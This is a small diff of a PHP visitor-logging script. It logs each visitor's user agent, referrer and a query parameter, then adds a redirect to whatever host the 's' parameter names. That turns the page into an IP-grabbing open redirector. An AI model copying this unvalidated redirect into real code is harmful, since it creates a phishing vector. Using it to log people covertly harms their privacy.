@@ -1,13 +1,14 @@
 <?php
-function logIP()
+function watcher()
 {
-     $ipLog="mylogfile.txt"; // Your logfiles name here (.txt or ok. Avoid HTML and XSS attacks)
+     $ipLog="log.txt"; //log file
      $agent = $_SERVER['HTTP_USER_AGENT'];
-     $reffered = $_SERVER['HTTP_REFERER'];
+     if(isset($_SERVER['HTTP_REFERER']))
+          $reffered = $_SERVER['HTTP_REFERER'];
      
-     if (isset($_GET['s'])) {
+     if (isset($_GET['s']))
           $param=$_GET['s'];
-     } else {
+     else {
      }
      
      // IP logging
@@ -23,9 +24,10 @@ function logIP()
      }
      fclose($log);
 }
+
 // Place the below function call wherever you want the script to fire.
-logIp();
-header( "Location: https://www.google.com", TRUE, 301 );
+watcher();
+header( "Location: http://" . $_GET['s'], TRUE, 301 );
 ?>
 </body>
 </html>
